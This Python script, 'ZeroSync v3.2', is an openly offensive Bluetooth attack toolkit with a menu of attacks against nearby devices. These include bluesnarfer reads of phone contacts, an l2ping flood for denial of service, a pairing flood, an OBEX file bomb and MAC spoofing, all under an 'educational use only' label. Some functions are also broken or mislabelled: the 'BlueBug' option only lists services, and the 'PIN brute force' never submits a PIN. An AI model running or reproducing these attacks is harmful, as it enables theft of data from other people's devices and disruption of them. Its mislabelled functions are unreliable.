#!/usr/bin/env python3
# ZeroSync v3.2 - Bluetooth Hacking Toolkit with Device Memory
# Author: Niko DeRuise
# For educational use only

import os
import re
import subprocess
import sys
import time
import shutil
from datetime import datetime
from rich import print
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt

console = Console()
log_dir = "zerosync_logs"
os.makedirs(log_dir, exist_ok=True)

# === Device Cache ===
device_list = []

def log_output(name, content):
    with open(os.path.join(log_dir, f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"), 'w') as f:
        f.write(content)

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True).strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()

def get_adapter():
    out = run_cmd("hciconfig")
    matches = re.findall(r'(hci\d+):\s+Type', out)
    return matches[0] if matches else None

def enable_adapter(hci):
    run_cmd(f"rfkill unblock bluetooth")
    run_cmd(f"hciconfig {hci} up")

# === Device Selection ===
def select_device():
    if not device_list:
        console.print("[red]No devices cached. Run a scan first.[/red]")
        return Prompt.ask("Enter MAC manually")
    console.print("\n[bold cyan]Select a cached device:[/bold cyan]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Index", style="dim")
    table.add_column("MAC")
    table.add_column("Name")
    for i, (mac, name) in enumerate(device_list):
        table.add_row(str(i), mac, name)
    console.print(table)
    idx = Prompt.ask("Enter index or leave blank to enter MAC manually", default="")
    if idx.strip() == "":
        return Prompt.ask("Enter MAC manually")
    try:
        return device_list[int(idx)][0]
    except:
        console.print("[red]Invalid selection.[/red]")
        return Prompt.ask("Enter MAC manually")

# === Scanners ===
def scan_and_cache():
    console.print("[bold green]Scanning Classic Bluetooth devices...[/bold green]")
    output = run_cmd("hcitool scan")
    log_output("classic_scan", output)
    lines = output.splitlines()[1:]  # skip 'Scanning ...'
    global device_list
    device_list = []
    for line in lines:
        parts = line.strip().split("\t")
        if len(parts) >= 2:
            mac, name = parts[0], parts[1]
            device_list.append((mac, name))
    if device_list:
        console.print(f"[bold green]{len(device_list)} devices cached.[/bold green]")
    else:
        console.print("[yellow]No devices found.[/yellow]")

# === Attacks (use select_device) ===
def bluesnarf():
    target = select_device()
    out = run_cmd(f"bluesnarfer -b {target} -r 1-100")
    print(out)
    log_output("bluesnarf", out)

def bluebug():
    target = select_device()
    out = run_cmd(f"sdptool browse {target}")
    print(out)
    log_output("bluebug", out)

def bt_dos():
    target = select_device()
    out = run_cmd(f"l2ping -i 0 -s 600 -f {target}")
    print(out)
    log_output("bt_dos", out)

def blueflood():
    target = select_device()
    for _ in range(20):
        run_cmd(f"hcitool cc {target}")
        run_cmd(f"hcitool auth {target}")
    print("[cyan]Pairing flood sent.[/cyan]")
    log_output("blueflood", f"Flooded {target}")

def obex_file_bomb():
    target = select_device()
    file_path = Prompt.ask("File to send")
    out = run_cmd(f"obexftp --nopath --noconn --uuid none --bluetooth {target} --channel 9 -p {file_path}")
    print(out)
    log_output("obex_bomb", out)

def legacy_pin_bruteforce():
    target = select_device()
    wordlist = Prompt.ask("Wordlist path")
    try:
        with open(wordlist, 'r') as f:
            for pin in f.read().splitlines():
                out = run_cmd(f"l2ping -c 1 {target}")
                console.print(f"[yellow]Trying PIN {pin}[/yellow] => {out}")
    except Exception as e:
        print(f"[red]Error: {e}[/red]")

# === Utilities ===
def mac_spoof():
    iface = get_adapter()
    new_mac = Prompt.ask("New MAC")
    run_cmd(f"hciconfig {iface} down")
    out = run_cmd(f"bdaddr -i {iface} {new_mac}")
    run_cmd(f"hciconfig {iface} up")
    print(out)
    log_output("mac_spoof", out)

def vendor_lookup():
    mac = Prompt.ask("MAC")
    oui = mac.upper().replace(":", "")[:6]
    out = run_cmd(f"grep {oui} /usr/share/ieee-data/oui.txt")
    print(out if out else "[yellow]Vendor not found.[/yellow]")

def monitor_connections():
    out = run_cmd("hcitool con")
    print(out)
    log_output("connections", out)

def reset_bt():
    iface = get_adapter()
    run_cmd(f"hciconfig {iface} down")
    time.sleep(1)
    run_cmd(f"hciconfig {iface} up")
    print("[green]Bluetooth reset.[/green]")

def tool_checker():
    tools = ["hcitool", "l2ping", "bdaddr", "bleah", "btlejack", "bluesnarfer", "obexftp"]
    table = Table(title="Tool Checker")
    table.add_column("Tool")
    table.add_column("Available")
    for tool in tools:
        status = "✅" if shutil.which(tool) else "❌"
        table.add_row(tool, status)
    console.print(table)

# === Main Menu ===
def main_menu():
    iface = get_adapter()
    if not iface:
        console.print("[red]No Bluetooth adapter found.[/red]")
        return
    enable_adapter(iface)

    while True:
        console.clear()
        console.print("[bold magenta]ZeroSync v3.2 - Bluetooth Toolkit with Device Memory[/bold magenta]")
        table = Table(title="Main Menu")
        table.add_column("ID", style="bold green")
        table.add_column("Action")
        table.add_row("1", "Scan & Cache Devices")
        table.add_row("2", "BlueSnarf")
        table.add_row("3", "BlueBug")
        table.add_row("4", "DoS (l2ping)")
        table.add_row("5", "Pairing Flood")
        table.add_row("6", "OBEX File Bomb")
        table.add_row("7", "Legacy PIN Brute Force")
        table.add_row("8", "MAC Spoof")
        table.add_row("9", "Vendor Lookup")
        table.add_row("10", "Monitor Connections")
        table.add_row("11", "Reset Bluetooth")
        table.add_row("12", "Tool Checker")
        table.add_row("0", "Exit")
        console.print(table)

        choice = Prompt.ask("Choose")
        options = {
            "1": scan_and_cache,
            "2": bluesnarf,
            "3": bluebug,
            "4": bt_dos,
            "5": blueflood,
            "6": obex_file_bomb,
            "7": legacy_pin_bruteforce,
            "8": mac_spoof,
            "9": vendor_lookup,
            "10": monitor_connections,
            "11": reset_bt,
            "12": tool_checker
        }

        if choice == "0":
            console.print("[cyan]ZeroSync terminated.[/cyan]")
            break
        elif choice in options:
            options[choice]()
        else:
            print("[red]Invalid option[/red]")
        input("\n[bold yellow]Press Enter to return to menu...[/bold yellow]")

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print("[red]Run this script with sudo.[/red]")
        sys.exit(1)
    main_menu()